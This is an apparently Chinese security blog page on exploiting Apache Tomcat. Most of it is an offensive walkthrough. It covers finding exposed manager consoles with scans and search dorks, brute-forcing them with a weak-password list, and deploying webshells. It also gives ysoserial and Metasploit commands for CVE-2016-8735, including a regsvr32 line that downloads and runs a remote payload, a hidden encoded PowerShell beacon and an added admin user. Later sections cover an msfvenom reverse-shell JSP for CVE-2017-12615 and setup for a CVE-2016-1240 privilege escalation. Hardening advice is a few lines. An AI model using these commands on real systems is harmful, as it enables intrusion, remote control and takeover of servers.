@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>tomcat 系列漏洞利用与安全加固 | shackle</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="Web应用安全" />
+  
+  
+  
+  
+  <meta name="description" content="Tomcat 系列漏洞利用与安全加固0x00 前言Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。 由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Ap">
+<meta name="keywords" content="Web应用安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat 系列漏洞利用与安全加固">
+<meta property="og:url" content="https://shackles.top/2018/02/03/Web应用安全-Tomcat 系列漏洞利用与安全加固/index.html">
+<meta property="og:site_name" content="shackle">
+<meta property="og:description" content="Tomcat 系列漏洞利用与安全加固0x00 前言Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。 由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Ap">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-10-16T16:06:31.034Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Tomcat 系列漏洞利用与安全加固">
+<meta name="twitter:description" content="Tomcat 系列漏洞利用与安全加固0x00 前言Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。 由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Ap">
+  
+    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo1.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/
+
+
+  </style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo1.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">首页</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">归档</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">关于</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Web应用安全-Tomcat 系列漏洞利用与安全加固" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Tomcat 系列漏洞利用与安全加固
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/02/03/Web应用安全-Tomcat 系列漏洞利用与安全加固/" class="article-date">
+	  <time datetime="2018-02-03T15:53:56.000Z" itemprop="datePublished">2018-02-03</time>
+	</a>
+
+      
+      
+
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Tomcat-系列漏洞利用与安全加固"><a href="#Tomcat-系列漏洞利用与安全加固" class="headerlink" title="Tomcat 系列漏洞利用与安全加固"></a>Tomcat 系列漏洞利用与安全加固</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
+<p>由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p>
+<h3 id="Tomcat-重要目录"><a href="#Tomcat-重要目录" class="headerlink" title="Tomcat 重要目录"></a>Tomcat 重要目录</h3><ul>
+<li><strong>/bin</strong> - Tomcat 脚本存放目录（如启动、关闭脚本）。 <code>*.sh</code> 文件用于 Unix 系统； <code>*.bat</code> 文件用于 Windows 系统。</li>
+<li><strong>/conf</strong> - Tomcat 配置文件目录。</li>
+<li><strong>/logs</strong> - Tomcat 默认日志目录。</li>
+<li><strong>/webapps</strong> - webapp 运行的目录。</li>
+</ul>
+<h3 id="web-工程发布目录结构"><a href="#web-工程发布目录结构" class="headerlink" title="web 工程发布目录结构"></a>web 工程发布目录结构</h3><p>一般 web 项目路径结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|-- webapp                         # 站点根目录</span><br><span class="line">    |-- META-INF                   # META-INF 目录</span><br><span class="line">    |   `-- MANIFEST.MF            # 配置清单文件</span><br><span class="line">    |-- WEB-INF                    # WEB-INF 目录</span><br><span class="line">    |   |-- classes                # class文件目录</span><br><span class="line">    |   |   |-- *.class            # 程序需要的 class 文件</span><br><span class="line">    |   |   `-- *.xml              # 程序需要的 xml 文件</span><br><span class="line">    |   |-- lib                    # 库文件夹</span><br><span class="line">    |   |   `-- *.jar              # 程序需要的 jar 包</span><br><span class="line">    |   `-- web.xml                # Web应用程序的部署描述文件</span><br><span class="line">    |-- &lt;userdir&gt;                  # 自定义的目录</span><br><span class="line">    |-- &lt;userfiles&gt;                # 自定义的资源文件</span><br></pre></td></tr></table></figure>
+<p><code>webapp</code>：工程发布文件夹。其实每个 war 包都可以视为 webapp 的压缩包。</p>
+<p><code>META-INF</code>：META-INF 目录用于存放工程自身相关的一些信息，元文件信息，通常由开发工具，环境自动生成。</p>
+<p><code>WEB-INF</code>：Java web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。</p>
+<p><code>/WEB-INF/classes</code>：存放程序所需要的所有 Java class 文件。</p>
+<p><code>/WEB-INF/lib</code>：存放程序所需要的所有 jar 文件。</p>
+<p><code>/WEB-INF/web.xml</code>：web 应用的部署配置文件。它是工程中最重要的配置文件，它描述了 servlet 和组成应用的其它组件，以及应用初始化参数、安全管理约束等。</p>
+<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><h3 id="1-发现目标的-tomcat-管理控制台入口"><a href="#1-发现目标的-tomcat-管理控制台入口" class="headerlink" title="1.    发现目标的 tomcat 管理控制台入口"></a>1.    发现目标的 tomcat 管理控制台入口</h3><p>第一种,通过常规端口扫描,获取服务 banner    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -n -sT -Pn --open -v -p 8080-8090,8443 -sV 192.168.3.100-200	tomcat 的默认端口通常情况下都会在这个区间内,至于具体用什么扫无所谓,masscan,zmap 都一样,只不过 nmap 会识别的更精准</span><br></pre></td></tr></table></figure>
+<p>第二种,通过各类外部 web 搜索引擎进行批量抓取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Googele dorks:</span><br><span class="line">nurl:/manager/html intitle:apache tomcat site:*.target.*	通 常 ,Tomcat 控 制 台 的 默 认 路 径 都 为 /manager/html </span><br><span class="line">intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat site:*.target.*	在低版本的 tomcat 欢迎页中还会写有 CATALINA 的路径,可把此作为关键字来精确搜索intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat/6.0.24 site:*.target.*	可以只找特定版本的 tomcat,比如,爆出专门针对某个特定版本 tomcat 的漏洞</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bing dorks:</span><br><span class="line">intitle:&quot;apache tomcat&quot; site:target.com	搜集特定目标的所有 tomcat 入口,个人觉得 bing 有时候比 google 更精准</span><br></pre></td></tr></table></figure>
+<p>第三种,通过各类空间搜索引擎进行批量抓取 [ 此处暂以 shodan 为例, zoomeye,fofa,censys…其实都差不多,不差钱的情况下,个人还是更建议直接用 shodan,毕竟它没有处理过搜索结果,脚本配合 api 批量抓会很方便 ]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net:&quot;40.112.0.0/16&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;	对某些大目标来讲,可先尝试获取它的 as 号,然后再根据 as 号查到的网段,批量抓 tomcat 入口</span><br></pre></td></tr></table></figure>
+<h3 id="2-低版本-tomcat-管理控制台的弱口令爆破"><a href="#2-低版本-tomcat-管理控制台的弱口令爆破" class="headerlink" title="2.    低版本 tomcat 管理控制台的弱口令爆破"></a>2.    低版本 tomcat 管理控制台的弱口令爆破</h3><p> 此处暂以 tomcat 6.0.9 为例进行演示 </p>
+<p>注意,此处所说的低版本 tomcat,通常是指 7.x 以下的版本,不包括 7.x,因为在 7.x 之后的版本中开始加入了防爆机制,会自动锁定正在爆破的用户,所以如果你在实战中看到 tomcat 7.x 以后的版本,基本都不用再尝试爆破了,也几乎不太可能爆出来,ok,说完利用前提,我们就来实际的干,首先,去添加好 tomcat 控制台角色用户,到 C:\apache-tomcat-6.0.9\conf\tomcat-users.xml 文件的<tomcat-users>标签内添加如下用户,注意,6.x 的角色名称可能不大一样,在角色后面没有-gui,7.x 版本之后的才有,配置完之后,运行 C:\apache-tomcat-6.0.9\bin\startup.bat 脚本即可启动 tomcat 服务</tomcat-users></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">role rolename="manager"/&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">roles</span>=<span class="string">"manager,admin"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>爆破 msf 中的 tomcat_mgr_login 模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">msf &gt; set rhosts 192.168.3.188 msf &gt; set rport 8080</span><br><span class="line">msf &gt; set targeturi /manager/html msf &gt; set username tomcat</span><br><span class="line">msf &gt; set pass_file /root/wordlist/passwd.txt</span><br><span class="line">msf &gt; set stop_on_success true msf &gt; set bruteforce_speed 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p>常见的 Tomcat 管理控制台弱口令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">admin:password</span><br><span class="line">admin:Password1 </span><br><span class="line">admin:password1</span><br><span class="line">admin:admin</span><br><span class="line">admin:123456 </span><br><span class="line">admin:a123456</span><br><span class="line">admin:12345678</span><br><span class="line">admin:j5Brn9 </span><br><span class="line">admin:tomcat</span><br><span class="line">tomcat:tomcat </span><br><span class="line">tomcat:s3cret </span><br><span class="line">tomcat:password1 </span><br><span class="line">tomcat:password</span><br><span class="line">tomcat:admin</span><br><span class="line">tomcat:changethis</span><br><span class="line">both:tomcat </span><br><span class="line">manager:manager </span><br><span class="line">role1:role1 </span><br><span class="line">role1:tomcat </span><br><span class="line">role:changethis </span><br><span class="line">root:Password1</span><br><span class="line">root:changethis </span><br><span class="line">root:password </span><br><span class="line">root:password1</span><br><span class="line">root:r00t </span><br><span class="line">root:toor </span><br><span class="line">root:root</span><br><span class="line">admin:</span><br><span class="line">tomcat:</span><br></pre></td></tr></table></figure>
+<h3 id="3-war包部署webshell"><a href="#3-war包部署webshell" class="headerlink" title="3.    war包部署webshell"></a>3.    war包部署webshell</h3><p>​    在 tomcat 的 manager 中控制台自带的自动 war 包部署功能来部署我们的 webshell</p>
+<p>把当前目录下的xiaoma.jsp文件打包成xiaoma.war</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfM0 xiaoma.war xiaoma.jsp</span><br><span class="line"></span><br><span class="line">-c 创建war包</span><br><span class="line">-v 显示过程信息</span><br><span class="line">-f</span><br><span class="line">-M</span><br><span class="line">-0 这个是阿拉伯数字，只打包不压缩的意思</span><br></pre></td></tr></table></figure>
+<p>防御：</p>
+<ul>
+<li>直接删掉 manager 目录</li>
+<li>加强web口令</li>
+<li>安全设备</li>
+</ul>
+<p>[Java类WebServer及中间件拿webshell方法总结]</p>
+<p>具体参见：<a href="https://www.cnblogs.com/shellr00t/p/5965727.html" target="_blank" rel="noopener">https://www.cnblogs.com/shellr00t/p/5965727.html</a></p>
+<h3 id="4-Tomacat-远程代码执行-CVE-2016-8735"><a href="#4-Tomacat-远程代码执行-CVE-2016-8735" class="headerlink" title="4.    Tomacat 远程代码执行[CVE-2016-8735 ]"></a>4.    Tomacat 远程代码执行[CVE-2016-8735 ]</h3><p>mark：<a href="http://www.freebuf.com/news/121868.html" target="_blank" rel="noopener">http://www.freebuf.com/news/121868.html</a></p>
+<h4 id="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"><a href="#前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的" class="headerlink" title="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"></a><strong>前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的</strong></h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><blockquote>
+<p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11</p>
+<p>Apache Tomcat 8.5.0 to 8.5.6</p>
+<p>Apache Tomcat 8.0.0.RC1 to 8.0.38</p>
+<p>Apache Tomcat 7.0.0 to 7.0.72</p>
+<p>Apache Tomcat 6.0.0 to 6.0.47</p>
+</blockquote>
+<p>在 Tomcat 中默认会使用 JmxRemoteLifecycleListener 这个监听器来监控 tomcat 平时的各种运行状态,但 Oracle 在修复了 JmxRemoteLifecycleListener 反序列化漏洞[CVE-2016-3427] 之后,却忘记了及时对 Tomcat<br>中的 jmx 监听器进行升级,这才导致了该漏洞的产生,所以,它本质还是 jmx 的漏洞并非 tomcat 自身漏洞,实际上 JmxRemoteLifecycleListener 平时用来做监控居多,没错,实战中直接从外部碰到该端口的机会也并不是特别多。</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>首先,依然是先准备好基础环境,配置 JmxRemoteLifecycleListener 监听器,注意,如果你发现自己 tomcat 的lib 目录中没有 catalina-jmx-remote.jar 这个包,请自行到官方站点下载好放进去,不然可能会出报错,不过一般默认都会有,而后编辑 C:\apache-tomcat-8.0.36\conf\server.xml 添加如下的监听器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>端口可随意,只要不冲突即可</p>
+<p>之后,再去编辑 C:\apache-tomcat-8.0.36\bin\catalina.bat 文件,添加如下变量,直接在 setlocal 下面开始添加,语句的主要作用是方便别人远程连过来对此 jvm 进行监控,注意,此处是没有启用用户认证</p>
+<p>最后,执行 C:\apache-tomcat-8.0.36\bin\startup.bat 脚本,启动 tomcat,看到 rmi 的端口全部正常起来以后,说明环境基本就没啥问题了</p>
+<p><strong>扫描：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sT -sV -p 1-50000 --open -Pn -v  [目标ip]</span><br></pre></td></tr></table></figure>
+<p><strong>反序列化 payload：</strong> </p>
+<p>ysoserial java 反序列化 payload 工具去执行系统命令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit [目标ip] 1000 1 Groovy1 "cmd.exe /c net user flag "Admin!@#45" /add"</span><br></pre></td></tr></table></figure>
+<p><strong>msf ：</strong></p>
+<p>很显然,在实战中,如果直接像上面这样执行系统命令利用起来肯定不够直接,我们现在不妨尝试直接配合 msf 一起利用,来尝试弹回一个 meterpreter 的 shell,具体过程如下</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 &gt; set target 3  			# regsvr32 来远程下载执行</span><br><span class="line">msf5 &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf5 &gt; set lhost [本地ip]</span><br><span class="line">msf5 &gt; set lport 53</span><br><span class="line">msf5 &gt; set rc4password klionsec msf5 &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">唯一需要注意的是,由于执行过程中需要远程下载 payload,所以这就要求当前目标机器必须能正常通外网才行,不然 payload 都下不了,meterpreter 自然也就弹不回来了</span><br><span class="line"></span><br><span class="line"># java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.188 10001 Groovy1 &quot;cmd.exe /c regsvr32 /s /n /u /i:http://192 .168.3.7:8080/CzVtq564v1ymsYr.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>powershell 回弹beacon：</strong></p>
+<p>如果你觉得 meterpreter 还不够直接,没问题,直接尝试利用 powershell 尝试弹个 beacon 的 shell 也是可以的,实际利用过程如下,先生成 ps 的 payload</p>
+<p>而后,继续通过 ysoserial.jar 发送执行该 payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar	ysoserial.exploit.RMIRegistryExploit [目标ip] 10001 Groovy1 " cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encode"</span><br></pre></td></tr></table></figure>
+<h3 id="5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615"><a href="#5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615" class="headerlink" title="5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]"></a>5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]</h3><p>mark:    <a href="https://paper.seebug.org/398/" target="_blank" rel="noopener">https://paper.seebug.org/398/</a></p>
+<h4 id="前提是启动PUT方法、默认关闭。"><a href="#前提是启动PUT方法、默认关闭。" class="headerlink" title="前提是启动PUT方法、默认关闭。"></a>前提是启动PUT方法、默认关闭。</h4><p>​     在配置文件conf/web.xml 文件。默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控。</p>
+<p><strong>用 msf 生成 jsp webshell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=[目标IP] LPORT=80 -f raw -o rev.jsp</span><br></pre></td></tr></table></figure>
+<p>通过 curl 把我们上面的 webshell 用重定向的方式直接 put 到目标机器的 web 根目录下,需要注意的是,默认 Tomcat 的 Servlet 是在 conf/web.xml 中配置的,当后缀名为 .jsp 和 .jspx 的时候,就会丢给JspServlet 处理,所以,我们需要对后缀做些特殊的处理,比如,在 url 最后加个 / . 或者 %20</p>
+<p>继续通过 curl 访问执行该 webshell,即可看到目标机器的 cmd shell 被成功弹回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://[目标IP]:8080/Readmes.jsp</span><br></pre></td></tr></table></figure></p>
+<h3 id="7-Tomcat-本地提权漏洞利用-CVE-2016-1240"><a href="#7-Tomcat-本地提权漏洞利用-CVE-2016-1240" class="headerlink" title="7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]"></a>7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]</h3><p>mark：<a href="http://www.freebuf.com/vuls/115862.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/115862.html</a></p>
+<blockquote>
+<p>Tomcat 8 &lt;= 8.0.36-2</p>
+<p>Tomcat 7 &lt;= 7.0.70-2</p>
+<p>Tomcat 6 &lt;= 6.0.45 + dfsg-1~deb8u1</p>
+<p>受影响的系统包括的Debian，Ubuntu的，其他使用相应的deb包的系统也可能受到影响。</p>
+</blockquote>
+<h4 id="前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级"><a href="#前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级" class="headerlink" title="前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],"></a>前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],</h4><p>简单回顾:</p>
+<p><strong>原理：劫持服务端配置文件</strong></p>
+<p>核心就在于 Tomcat 服务在启动时 [关键代码如下] 会将 log 文件 catalina.out 的所有者改为 Tomcat 用户[降权行为],而启动脚本通常却是以 root 权限在执行,那么借助此特性,我们可以通过用创建软链接的方式,在<br>root 重启 tomcat 服务时将任意文件的属主改为 Tomcat 账户,以达到降权访问系统核心配置文件的目的,比如,你事先在 tomcat 权限下将 catalina.out 修改为指向那些原本需要高权限才能访问到的关键性系统文件的软链接,此后 root 重启 tomat 便可以随意访问该系统配置文件,说到底这其实还是一种非常典型的配置文件加载劫持手法,更深入的就不说了,主要还是看在实战中如何利用,漏洞关键代码如下,就那一句</p>
+<p>默认网站目录位置:<br>/var/lib/tomcat7/webapps/ROOT</p>
+<p>添加控制台角色用户,等会儿部署 webshell 要用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/tomcat7/tomcat-users.xml</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager -gui,admin-gui&quot;/&gt;</span><br><span class="line"># /etc/init.d/tomcat7 restart	重启 tomcat 服务</span><br></pre></td></tr></table></figure>
+<p>下面,我们来着重看看具体利用过程,先尝试通过部署 war 包弹回一个低权限的 meterpreter 的 shell</p>
+<p>用 msf 快速生成一个 war 包 webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
+<p>再通过默认 manager 管理控制台把自己 war 包 webshell 部署到目标机器上去</p>
+<p>接着,本地启动 msf 执行监听,访问我们刚刚部署好的 war 包 webshell 的 url <a href="http://192.168.3.153:8080/options,随后便可看到" target="_blank" rel="noopener">http://192.168.3.153:8080/options,随后便可看到</a> meterpreter 被正常弹回,注意,此时弹回的权限仍然比较低,只是个 tomcat 服务用户权限</p>
+<p>而后,开始今天的重点,首先,找到 catalina.out 文件所在的路径,默认会在/var/log/tomcat7 目录下,实战中如果实在找不到,不妨直接 find 下,而后上传 exp 脚本并赋予执行权限</p>
